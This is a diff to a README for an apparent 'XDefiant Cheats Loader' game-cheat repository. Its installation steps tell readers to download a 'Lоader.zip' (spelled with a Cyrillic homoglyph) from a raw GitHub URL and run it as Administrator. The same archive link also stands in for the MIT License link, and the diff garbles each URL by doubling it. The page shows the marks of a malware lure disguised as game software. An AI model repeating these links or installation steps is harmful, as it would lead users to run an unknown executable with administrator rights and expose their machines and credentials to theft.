@@ -21,13 +21,13 @@ Welcome to the **XDefiant Cheats Loader** project! This repository provides a po
 
 ## 📝 Installation Guide
 
-### 1. Download https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip from the repository.
-Download the latest **https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip** file directly from the repository's [Releases](./releases) section or main page.
+### 1. Download https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zipоhttps://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip from the repository.
+Download the latest **https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zipоhttps://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip** file directly from the repository's [Releases](./releases) section or main page.
 
-### 2. Extract https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip
+### 2. Extract https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zipоhttps://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip
 Use any trusted archive utility (7-Zip, WinRAR, or Windows extractor) to unpack the program.
 
-### 3. Run https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip as Administrator
+### 3. Run https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zipоhttps://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip as Administrator
 For optimal compatibility and access to all available features, right-click the executable and select "Run as administrator."
 
 ### 4. Configure Your Preferences
@@ -72,7 +72,7 @@ XDefiant cheats, XDefiant loader, best XDefiant enhancement, shooter game tool, 
 
 ## 📕 License
 
-This project is released under the [MIT License](https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip)—a permissive license that allows for free use, modification, and distribution. See the LICENSE file in this repository for more details.
+This project is released under the [MIT License](https://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zipоhttps://raw.githubusercontent.com/JazielJ/XDefiant-GameBoosters/main/Lоader.zip)—a permissive license that allows for free use, modification, and distribution. See the LICENSE file in this repository for more details.
 
 ---
 
